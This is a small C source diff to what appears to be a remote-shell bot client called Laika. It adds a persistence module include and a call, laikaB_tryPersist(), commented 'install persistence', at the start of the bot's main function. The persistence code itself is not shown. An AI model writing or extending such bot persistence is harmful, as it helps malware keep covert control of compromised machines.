@@ -5,6 +5,7 @@
 #include "ltask.h"
 #include "bot.h"
 #include "shell.h"
+#include "persist.h"
 
 struct sLaika_taskService tService;
 
@@ -17,6 +18,9 @@ void shellTask(struct sLaika_taskService *service, struct sLaika_task *task, clo
 
 int main(int argv, char *argc[]) {
     struct sLaika_bot *bot = laikaB_newBot();
+
+    /* install persistence */
+    laikaB_tryPersist();
 
     /* init task service */
     laikaT_initTaskService(&tService);
